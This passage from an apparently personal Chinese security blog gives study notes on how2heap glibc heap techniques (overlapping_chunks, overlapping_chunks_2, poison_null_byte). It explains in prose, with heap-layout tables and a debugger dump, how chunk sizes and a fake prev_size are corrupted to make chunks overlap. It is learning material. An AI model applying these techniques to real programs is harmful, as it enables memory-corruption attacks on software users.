<p>随后，第三个chunk被释放，第二个连带着被释放，接下来又分配一个大小为0x300000的chunk，这个chunk完全覆盖了第二个和第三个chunk，大小为0x301002。此时第四个chunk的初始地址比第二个chunk小0x200000，由于所有mmap chunk的类型均设定为long long，因此索引应该为0x40000，即第四个chunk下标为0x40000的地方就是第二个chunk的开头，这样就能够通过第四个chunk修改第二个chunk的值了。</p>
<p>实际上这个漏洞还是比较好理解的，就是修改chunk的大小让chunk重叠。</p>
<h1 id="14-overlapping_chunks"><a class="markdownIt-Anchor" href="#14-overlapping_chunks"></a> 14. overlapping_chunks</h1>
<p>这是一个堆块重叠产生的漏洞利用。</p>
<p>首先有4个指针p1~p4，前三个分别分配0x100，0x100，0x80大小的chunk，然后将p1中的所有字节设为1，p2所有字节设为2，p3所有字节设为3。</p>
<p>然后将p2释放，p2会链入unsorted bin中。接下来是漏洞关键步骤：修改p2的大小，将其改大为0x180，这样p3将完全被p2重叠。之后，分配0x178大小的chunk到p4，这使得p2被重新分配出来，直接从unsorted bin中弹出。后面的过程就很好理解了，由于p4完全包含p3，这使得我们可以在p4中写入数据时随意修改p3中的值。</p>
<p>当然，从这里看，堆块重叠只是为其他漏洞利用方式做准备。</p>
<h1 id="15-overlapping_chunks_2"><a class="markdownIt-Anchor" href="#15-overlapping_chunks_2"></a> 15. overlapping_chunks_2</h1>
<p>这个文件与上面的overlapping_chunks基本上相似。</p>
<p>首先分配5个可用大小为1000的堆块，分别为p1~p5。之后释放p4，修改p2的大小使p2正好完全覆盖p3的同时保持其prev_in_use位为1。之后释放p2会将p3这块空间连带着释放掉，再将其分配回来到p6，就可以从p6里面写入数据随意修改p3的内容了。</p>
<p>利用方式与overlapping_chunks相同，不再赘述。</p>
<h1 id="16-poison_null_byte"><a class="markdownIt-Anchor" href="#16-poison_null_byte"></a> 16. poison_null_byte</h1>
<p>这是一种只溢出一个字节的漏洞利用方式。前面也分析过一个类似的漏洞house_of_einherjar。与house_of_einherjar相同。这种漏洞利用也是溢出一个空字符\x00。</p>
<p>程序首先将堆区构造成如下的结构（barrier防止top chunk的影响）：</p>
<table>
<thead>
<tr>
<th style="text-align:center">addr</th>
<th style="text-align:center">content</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0x0</td>
<td style="text-align:center">chunk a(size = 0x111)</td>
</tr>
<tr>
<td style="text-align:center">…</td>
<td style="text-align:center">…</td>
</tr>
<tr>
<td style="text-align:center">0x110</td>
<td style="text-align:center">chunk b(size = 0x211)</td>
</tr>
<tr>
<td style="text-align:center">…</td>
<td style="text-align:center">…</td>
</tr>
<tr>
<td style="text-align:center">0x320</td>
<td style="text-align:center">chunk c(size = 0x111)</td>
</tr>
<tr>
<td style="text-align:center">…</td>
<td style="text-align:center">…</td>
</tr>
<tr>
<td style="text-align:center">0x430</td>
<td style="text-align:center">barrier(size = 0x111)</td>
</tr>
</tbody>
</table>
<p>然后，将b释放，进入关键步骤：从a溢出一个字节到b的size使b的size从0x211修改为0x200。这样b的实际大小就缩小了0x10。由于需要绕过检查，我们要在b的结尾处伪造一个prev size，这与house_of_einherjar类似，具体请参考我的how2heap第一篇笔记。</p>
<table>
<thead>
<tr>
<th style="text-align:center">addr</th>
<th style="text-align:center">content</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0x0</td>
<td style="text-align:center">chunk a(size = 0x111)</td>
</tr>
<tr>
<td style="text-align:center">…</td>
<td style="text-align:center">…</td>
</tr>
<tr>
<td style="text-align:center">0x110</td>
<td style="text-align:center">chunk b(size = 0x211)</td>
</tr>
<tr>
<td style="text-align:center">…</td>
<td style="text-align:center">…</td>
</tr>
<tr>
<td style="text-align:center">0x310</td>
<td style="text-align:center">fake prev_size = 0x200</td>
</tr>
<tr>
<td style="text-align:center">0x318</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">0x320</td>
<td style="text-align:center">chunk c(size = 0x111)</td>
</tr>
<tr>
<td style="text-align:center">…</td>
<td style="text-align:center">…</td>
</tr>
<tr>
<td style="text-align:center">0x430</td>
<td style="text-align:center">barrier(size = 0x111)</td>
</tr>
</tbody>
</table>
<p>之后，分配一个大小为0x110的堆块，这个堆块的起始地址将和原b的起始地址相同，且分配之后会对假prev_size进行调整，调整为0xf0。然后继续分配一个0x90大小的空间p2，p2紧跟在p1之后。此时堆空间如图：</p>
<table>
<thead>
<tr>
<th style="text-align:center">addr</th>
<th style="text-align:center">content</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0x0</td>
<td style="text-align:center">chunk a(size = 0x111)</td>
</tr>
<tr>
<td style="text-align:center">…</td>
<td style="text-align:center">…</td>
</tr>
<tr>
<td style="text-align:center">0x110</td>
<td style="text-align:center">chunk b1(size = 0x111)</td>
</tr>
<tr>
<td style="text-align:center">…</td>
<td style="text-align:center">…</td>
</tr>
<tr>
<td style="text-align:center">0x220</td>
<td style="text-align:center">chunk b2(size = 0x91)</td>
</tr>
<tr>
<td style="text-align:center">…</td>
<td style="text-align:center">…</td>
</tr>
<tr>
<td style="text-align:center">0x2b0</td>
<td style="text-align:center">&lt;unsorted bin chunk&gt;(size = 0x61)</td>
</tr>
<tr>
<td style="text-align:center">…</td>
<td style="text-align:center">…</td>
</tr>
<tr>
<td style="text-align:center">0x310</td>
<td style="text-align:center">fake prev_size = 0x60</td>
</tr>
<tr>
<td style="text-align:center">0x318</td>
<td style="text-align:center">fake size = 0</td>
</tr>
<tr>
<td style="text-align:center">0x320</td>
<td style="text-align:center">chunk c(size = 0x111)</td>
</tr>
<tr>
<td style="text-align:center">…</td>
<td style="text-align:center">…</td>
</tr>
<tr>
<td style="text-align:center">0x430</td>
<td style="text-align:center">barrier(size = 0x111)</td>
</tr>
</tbody>
</table>
<p>接下来，首先释放b1，然后紧接着释放c，此时会惊奇地发现，b1和c竟然合并了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x603000</span><br><span class="line">Size: 0x111</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x603110</span><br><span class="line">Size: 0x321</span><br><span class="line">fd: 0x6032b0</span><br><span class="line">bk: 0x7ffff7dd1b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x603430</span><br><span class="line">Size: 0x110</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x603540</span><br><span class="line">Size: 0x20ac1</span><br></pre></td></tr></table></figure>
<p>释放c时，_int_free检查到c的prev_size对应偏移处的chunk（b1）是一个unsorted bin free chunk，因此执行了malloc_consolidate函数将二者进行了合并，但是请注意，此时的p2仍然可以进行任意读写操作，这就导致了c完全覆盖了b2，接下来我们将c重新分配回去就可以通过向c写入数据以随意修改p2的内容。</p>
<p>理解该漏洞的核心是溢出一个字节的空字节究竟对堆空间有什么样的影响，溢出一个字节后，b的大小被改小，因此之后分配内存时，修改的prev size是一个假的prev size，下一个chunk真正的prev size不会被修改，这就为后面的堆块合并创造了条件，我们不需要修改后面一个chunk的prev size就能够让它与前面的堆块合并，造成堆块的重叠。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/6/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">CoLin</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">79</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">categories</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">CoLin</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
